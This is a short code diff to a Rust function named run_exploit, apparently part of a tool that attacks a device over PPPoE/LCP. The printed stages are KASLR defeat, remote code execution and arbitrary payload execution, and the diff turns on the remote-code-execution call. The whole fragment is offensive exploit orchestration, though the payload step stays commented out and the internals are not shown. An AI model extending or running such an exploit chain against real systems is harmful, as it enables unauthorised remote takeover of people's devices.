@@ -20,6 +20,7 @@ fn run_exploit(interface_name: String) {
         pppoe_softc: 0,
         host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
         target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+        source_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
     };
     // LCP
     let mut handler = exploit::LcpEchoHandler::new(&interface);
@@ -37,13 +38,12 @@ fn run_exploit(interface_name: String) {
     println!("[+] STAGE 2: KASLR defeat");
     expl.defeat_kaslr(&interface);
     println!("[+] STAGE 3: Remote code execution");
-    // expl.remote_code_exec(&interface); // TODO
-    // Final actions of Remote code execution stages
+    expl.remote_code_exec(&interface); // TODO Add malicious LCP
     expl.ppp_negotiation(&interface);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] STAGE 4: Arbitrary payload execution");
-    // expl.frag_and_send(&interface, stage2)
+    // expl.frag_and_send(&interface, stage2);
     handler.stop();
     println!("[+] DONE!");
 }
